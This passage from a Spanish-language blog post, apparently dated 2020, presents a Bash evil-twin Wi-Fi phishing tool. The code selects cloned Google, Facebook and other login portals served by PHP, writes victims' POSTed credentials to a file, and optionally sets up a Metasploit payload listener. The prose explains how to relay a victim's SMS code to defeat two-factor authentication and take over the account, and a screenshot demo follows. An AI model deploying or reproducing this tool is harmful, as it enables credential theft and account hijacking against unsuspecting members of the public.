	<span class="n">tput</span> <span class="n">cnorm</span><span class="p">;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\n</span><span class="s">${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}</span><span class="se">\n\n</span><span class="s">"</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} "</span> <span class="o">&amp;&amp;</span> <span class="n">read</span> <span class="n">template</span>

	<span class="n">check_plantillas</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> <span class="k">for</span> <span class="n">plantilla</span> <span class="n">in</span> <span class="s">"${plantillas[@]}"</span><span class="p">;</span> <span class="n">do</span>
		<span class="k">if</span> <span class="p">[</span> <span class="s">"$plantilla"</span> <span class="o">==</span> <span class="s">"$template"</span> <span class="p">];</span> <span class="n">then</span>
			<span class="n">check_plantillas</span><span class="o">=</span><span class="m">1</span>
		<span class="n">fi</span>
	<span class="n">done</span>

	<span class="k">if</span> <span class="p">[</span> <span class="s">"$template"</span> <span class="o">==</span> <span class="s">"cliqq-payload"</span> <span class="p">];</span> <span class="n">then</span>
		<span class="n">check_plantillas</span><span class="o">=</span><span class="m">2</span>
	<span class="n">fi</span>

	<span class="k">if</span> <span class="p">[</span> <span class="err">$</span><span class="n">check_plantillas</span> <span class="o">-</span><span class="n">eq</span> <span class="m">1</span> <span class="p">];</span> <span class="n">then</span>
		<span class="n">tput</span> <span class="n">civis</span><span class="p">;</span> <span class="n">pushd</span> <span class="err">$</span><span class="n">template</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"</span>
		<span class="n">php</span> <span class="o">-</span><span class="n">S</span> <span class="m">192.168.1.1</span><span class="o">:</span><span class="m">80</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&amp;</span>
		<span class="n">sleep</span> <span class="m">2</span>
		<span class="n">popd</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span><span class="p">;</span> <span class="n">getCredentials</span>
	<span class="n">elif</span> <span class="p">[</span> <span class="err">$</span><span class="n">check_plantillas</span> <span class="o">-</span><span class="n">eq</span> <span class="m">2</span> <span class="p">];</span> <span class="n">then</span>
		<span class="n">tput</span> <span class="n">civis</span><span class="p">;</span> <span class="n">pushd</span> <span class="err">$</span><span class="n">template</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"</span>
		<span class="n">php</span> <span class="o">-</span><span class="n">S</span> <span class="m">192.168.1.1</span><span class="o">:</span><span class="m">80</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&amp;</span>
		<span class="n">sleep</span> <span class="m">2</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"</span>
		<span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">seq</span> <span class="m">1</span> <span class="m">45</span><span class="p">);</span> <span class="n">do</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${redColour}-"</span><span class="p">;</span> <span class="n">done</span> <span class="o">&amp;&amp;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${endColour}"</span>
		<span class="n">cat</span> <span class="n">msfconsole</span><span class="o">.</span><span class="n">rc</span>
		<span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">seq</span> <span class="m">1</span> <span class="m">45</span><span class="p">);</span> <span class="n">do</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${redColour}-"</span><span class="p">;</span> <span class="n">done</span> <span class="o">&amp;&amp;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${endColour}"</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${redColour}[!] Presiona &lt;Enter&gt; para continuar${endColour}"</span> <span class="o">&amp;&amp;</span> <span class="n">read</span>
		<span class="n">popd</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span><span class="p">;</span> <span class="n">getCredentials</span>
	<span class="k">else</span>
		<span class="n">tput</span> <span class="n">civis</span><span class="p">;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"</span><span class="p">;</span> <span class="n">sleep</span> <span class="m">1</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span> <span class="n">sleep</span> <span class="m">1</span>
		<span class="n">pushd</span> <span class="err">$</span><span class="n">template</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span>
		<span class="n">php</span> <span class="o">-</span><span class="n">S</span> <span class="m">192.168.1.1</span><span class="o">:</span><span class="m">80</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&amp;</span>
		<span class="n">sleep</span> <span class="m">2</span>
		<span class="n">popd</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span><span class="p">;</span> <span class="n">getCredentials</span>
	<span class="n">fi</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Es de esperar que en esta fase, se nos solicite con qué plantilla queremos trabajar.</p>

<p>En caso de seleccionar alguna, por ejemplo imaginemos… ‘<strong>google-login</strong>’, lo que sucederá es que desde que el cliente se conecte al AP, automáticamente se le abrirá el navegador, siendo redirigido a un portal de autenticación, en este caso, de la plataforma de Google, donde verá que para continuar navegando es necesario loguearse con su cuenta de la plantilla seleccionada.</p>

<p>La víctima en ningún momento verá direcciones IP ni nada por el estilo, por lo que le hará pensar en todo momento que se encuentra en la página oficial.</p>

<p>Cada plantilla está organizada en su propio directorio, donde tras seleccionar aquella con la que queramos trabajar, se efectúa un <code class="language-plaintext highlighter-rouge">pushd</code> hacia ese directorio para posteriormente montar un servidor web mediante <code class="language-plaintext highlighter-rouge">php</code> hosteado por el puerto 80.</p>

<p>Ya en este punto, se llama a la función <code class="language-plaintext highlighter-rouge">getCredentials</code>, que es la que se encargará de monitorizar un fichero desde el cual podremos saber en todo momento quién ha introducido sus credenciales, pudiéndolas ver posteriormente en texto claro:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="n">getCredentials</span><span class="p">(){</span>

	<span class="n">tput</span> <span class="n">civis</span><span class="p">;</span> <span class="n">while</span> <span class="no">true</span><span class="p">;</span> <span class="n">do</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}</span><span class="se">\n</span><span class="s">${endColour}"</span>
		<span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">seq</span> <span class="m">1</span> <span class="m">60</span><span class="p">);</span> <span class="n">do</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${redColour}-"</span><span class="p">;</span> <span class="n">done</span> <span class="o">&amp;&amp;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${endColour}"</span>
		<span class="n">find</span> <span class="err">\</span><span class="o">-</span><span class="n">name</span> <span class="n">datos</span><span class="o">-</span><span class="n">privados</span><span class="o">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">xargs</span> <span class="n">cat</span> <span class="m">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
		<span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">seq</span> <span class="m">1</span> <span class="m">60</span><span class="p">);</span> <span class="n">do</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${redColour}-"</span><span class="p">;</span> <span class="n">done</span> <span class="o">&amp;&amp;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${endColour}"</span>
		<span class="n">sleep</span> <span class="m">3</span><span class="p">;</span> <span class="n">clear</span>
	<span class="n">done</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Dado que es probable que la víctima cuente con el segundo factor de autenticación activado, disponer de sus credenciales a veces no es suficiente… ya que tras loguearnos tendremos que introducir el código que por SMS la plataforma le envía al dispositivo móvil asociado.</p>

<p>No os preocupéis, está todo pensado. Cada plantilla del portal seleccionado cuenta con un fichero <code class="language-plaintext highlighter-rouge">post.php</code>, donde tras reportar las credenciales a un fichero externo, se aplica un <code class="language-plaintext highlighter-rouge">Redirect</code> hacia otra plantilla de la misma plataforma, donde se solicita el código recibido:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">'datos-privados.txt'</span><span class="p">;</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span> <span class="nx">FILE_APPEND</span><span class="p">);</span><span class="cp">?&gt;</span><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0; url=http://192.168.1.1/portal_2fa/index.php"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

<p>Para el que no haya entendido bien la jugada, la explico por aquí: La víctima introduce sus credenciales de acceso a la plataforma que hayas escogido para seguir navegando, tú como atacante recibes esas credenciales en texto claro desde consola, posteriormente la víctima es redirigida a otro portal en el que se le pide que introduzca el SMS recibido. El truco está en que la víctima no tiene salida a internet desde tu AP, por lo que nunca recibirá un código de esa sesión, ya que no se está logueando en la plantilla oficial. El chiste está en que tú por detrás, como ya posees sus credenciales, de manera inmediata las vas a estar validando en la plataforma real manualmente, entonces en caso de que posteriormente te pida el código del segundo factor de autenticación, como la víctima está ahora en esa plantilla esperando al código, le va a llegar un SMS pero de tú sesión, no de la suya, lo que le hará pensar que ya una vez introduciéndolo accederá a su cuenta.</p>

<p>De esta forma, te proporcionará el código SMS de tu sesión, pudiendo así posteriormente acceder a su cuenta “burlando” esta medida de protección.</p>

<p>La gran pregunta que algunos me hicisteis… ¿pero y si la víctima no tiene el segundo factor de autenticación habilitado?, pues bueno, en ese caso ya tienes sus credenciales. Es posible que la víctima sospeche y le resulte extraño que se le esté solicitando el código del SMS cuando ni si quiera tiene esa opción configurada, pero es la única forma que se me ocurrió de por lo menos cubrir ambas situaciones. También os digo… un público objetivo de calle no tiene muchas nociones de seguridad y la mayoría de las veces no lo entienden, dejándolo pasar sin sospechar de nada.</p>

<p>En resumen, si la víctima tiene 2FA, podrás obtener el código, y si no lo tiene configurado… en el peor de los casos ya tienes sus credenciales, la víctima se quedará en la nueva plantilla esperando a que le llegue el código cuando nunca le va a llegar y tú mientras por detrás estarás accediendo a su cuenta.</p>

<p>Como pequeña anotación, durante el evento, algunos compañeros hicieron uso de la herramienta y me comentaron que algunos introdujeron incluso hasta sus credenciales de empresa.</p>

<h2 id="demo-de-la-herramienta">Demo de la herramienta</h2>

<p>Configuramos las características de nuestro AP:</p>

<p><img src="/assets/images/evil-trust/step_one.png" alt=""></p>

<p>Definimos la plantilla a utilizar:</p>

<p><img src="/assets/images/evil-trust/step_two.png" alt=""></p>

<p>Quedamos a la espera de que alguna víctima se conecte a nuestro AP para visualizar credenciales introducidas:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_three.png">
</p>

<p>La víctima ve que hay una WiFi gratis disponible a su alcance y se conecta:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_four.jpg">
</p>

<p>Tras la asociación al AP, se abre el navegador de manera automática solicitando las credenciales de acceso a la plataforma para continuar navegando:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_five.jpg">
</p>

<p>La víctima introduce sus credenciales para poder continuar navegando:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_six.jpg">
</p>

<p>El atacante visualiza las credenciales introducidas:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_seven.png">
</p>

<p>La víctima es redirigida al portal del segundo factor de autenticación de la plataforma:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_eight.jpg">
</p>

<p>El atacante valida las credenciales de la víctima desde otro navegador y como esta utiliza segundo factor de autenticación, se envía un SMS a la víctima, introduciendo posteriormente su código en la plantilla:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_nine.jpg">
</p>

<p>El atacante recibe desde consola el código y posteriormente accede a su cuenta:</p>

<p align="center">
<img src="/assets/images/evil-trust/step_ten.png">
</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#bash" class="page__taxonomy-item" rel="tag">Bash</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#github" class="page__taxonomy-item" rel="tag">GitHub</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#portswigger" class="page__taxonomy-item" rel="tag">Portswigger</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2020-02-02T00:00:00+01:00">February 02, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="#" class="pagination--pager disabled">Previous</a>
    
    
      <a href="/oswp-preparacion/" class="pagination--pager" title="Preparación OSWP
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 Aitorgg02</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
